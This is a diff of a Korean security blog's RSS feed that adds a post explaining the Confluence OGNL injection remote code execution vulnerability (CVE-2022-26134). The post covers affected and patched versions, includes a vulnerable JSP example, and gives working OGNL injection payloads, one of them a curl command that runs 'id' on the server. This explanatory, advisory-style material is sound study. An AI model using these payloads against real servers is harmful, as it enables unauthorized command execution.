@@ -6,7 +6,57 @@
         <description>Recent content on SooHo&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 26 Jun 2022 09:40:46 +0900</lastBuildDate><atom:link href="https://appealso.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 04 Jul 2022 22:22:46 +0900</lastBuildDate><atom:link href="https://appealso.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Confluence 원격 코드 취약점 정리(CVE-2022-26134)</title>
+        <link>https://appealso.github.io/p/confluence-%EC%9B%90%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%ACcve-2022-26134/</link>
+        <pubDate>Mon, 04 Jul 2022 22:22:46 +0900</pubDate>
+        
+        <guid>https://appealso.github.io/p/confluence-%EC%9B%90%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%ACcve-2022-26134/</guid>
+        <description>&lt;img src="https://appealso.github.io/p/confluence-%EC%9B%90%EA%B2%A9-%EC%BD%94%EB%93%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%95%EB%A6%ACcve-2022-26134/cover.png" alt="Featured image of post Confluence 원격 코드 취약점 정리(CVE-2022-26134)" /&gt;&lt;h2 id=&#34;개요&#34;&gt;개요&lt;/h2&gt;
+&lt;p&gt;Confluence에서 원격 코드 취약점이 발견 되었습니다. Confluence Server 및 Data Center에서 OGNL 인젝션으로 인해 발생하는 원격코드실행 취약점(CVE-2022-26134)으로 SaaS서비스가 아닌 자체 구축버전에서 발견된 것으로 파악됩니다.&lt;/p&gt;
+&lt;h2 id=&#34;영향-받는-버전&#34;&gt;영향 받는 버전&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Confluence Server and Data Center	1.3.0 이후 모든 버전&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;패치된-버전&#34;&gt;패치된 버전&lt;/h2&gt;
+&lt;p&gt;Confluence Server 7.4.17
+Confluence Server 7.13.7
+Confluence Server 7.14.3
+Confluence Server 7.15.2
+Confluence Server 7.16.4
+Confluence Server 7.17.4
+Confluence Server 7.18.1&lt;/p&gt;
+&lt;h2 id=&#34;발생원리&#34;&gt;발생원리&lt;/h2&gt;
+&lt;h3 id=&#34;ognl-injection이란&#34;&gt;OGNL Injection이란?&lt;/h3&gt;
+&lt;p&gt;OGNL(Object Graph Navigation Language)은 Java용 오픈 소스 EL(Expression Language)로, Java 언어에서 지원하는 전체 범위보다 간단한 표현식을 사용하면서 정의된 setProperty 및 getProperty를 통해 속성을 가져오고 설정할 수 있습니다.&lt;/p&gt;
+&lt;h4 id=&#34;ognl-예시&#34;&gt;OGNL 예시&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-jsp&#34; data-lang=&#34;jsp&#34;&gt;&amp;lt;%@page contentType=&amp;quot;text/html;charset=utf-8&amp;quot;%&amp;gt;
+&amp;lt;%@page import=&amp;quot;ognl.Ognl&amp;quot;%&amp;gt;
+&amp;lt;%@page import=&amp;quot;ognl.OgnlContext&amp;quot;%&amp;gt;
+&amp;lt;%
+  String param=request.getParameter(&amp;quot;param&amp;quot;);
+  OgnlContext ctf = new OgnlContext();
+  Object value = Ognl.getValue(param,ctx,&amp;quot;&amp;quot;);
+%&amp;gt;
+입력 값: &amp;lt;%=value%&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;위에 코드를 보면 param이라는 변수에 저장된 명령어를 value에 저장하여 실행하는 것을 볼 수 있습니다. 취약점은 여기서 param 변수에서 발생합니다. 변수에 아무런 검증 없이 값이 들어올 수 있어 시스템 명령어가 실행되는 원리입니다. 예를 들어 공격하는 입장이라면 아래와 같은 URL을 만들어 호출하고 공격을 할 수 있을 것입니다.&lt;/p&gt;
+&lt;h4 id=&#34;공격-예시&#34;&gt;공격 예시&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;http://attack.url/test.jsp?param=%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22touch%20/tmp/r7%22%29%7D
+&amp;gt;&amp;gt; Deconde: http://attack.url/test.jsp?param=${@java.lang.Runtime@getRuntime().exec(&amp;quot;touch /tmp/r7&amp;quot;)}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;confluence-원격-코드-취약점-cve-2022-26134&#34;&gt;Confluence 원격 코드 취약점 (CVE-2022-26134)&lt;/h3&gt;
+&lt;p&gt;Confluence 원격 코드 취약점도 위에서 설명한 OGNL Injection을 활용한 취약점 입니다. OGNL 페이로드는 HTTP 요청의 URI에 배치됩니다. 가장 간단한 형태는 아래와 같습니다.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;curl -v http://attack.url/%24%7b%28%23%61%3d%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%74%6f%53%74%72%69%6e%67%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%64%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%22%75%74%66%2d%38%22%29%29%2e%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%77%65%62%77%6f%72%6b%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%73%65%74%48%65%61%64%65%72%28%22%58%2d%43%6d%64%2d%52%65%73%70%6f%6e%73%65%22%2c%23%61%29%29%7d
+&amp;gt;&amp;gt; decode: curl -v http://attack.url/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&amp;quot;id&amp;quot;).getInputStream(),&amp;quot;utf-8&amp;quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&amp;quot;X-Cmd-Response&amp;quot;,#a))}
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;참고&#34;&gt;참고&lt;/h2&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=66752&amp;amp;queryString=cGFnZT0xJnNvcnRfY29kZT0mc29ydF9jb2RlX25hbWU9JnNlYXJjaF9zb3J0PXRpdGxlX25hbWUmc2VhcmNoX3dvcmQ9Y29uZmx1ZQ==&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=66752&amp;queryString=cGFnZT0xJnNvcnRfY29kZT0mc29ydF9jb2RlX25hbWU9JnNlYXJjaF9zb3J0PXRpdGxlX25hbWUmc2VhcmNoX3dvcmQ9Y29uZmx1ZQ==&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;amp;blogId=skinfosec2000&amp;amp;logNo=220954123887&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://m.blog.naver.com/PostView.naver?isHttpsRedirect=true&amp;blogId=skinfosec2000&amp;logNo=220954123887&lt;/a&gt;
+&lt;a class=&#34;link&#34; href=&#34;https://blog.alyac.co.kr/4772&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.alyac.co.kr/4772&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>Markdown XSS</title>
         <link>https://appealso.github.io/p/markdown-xss/</link>
         <pubDate>Sun, 26 Jun 2022 09:40:46 +0900</pubDate>
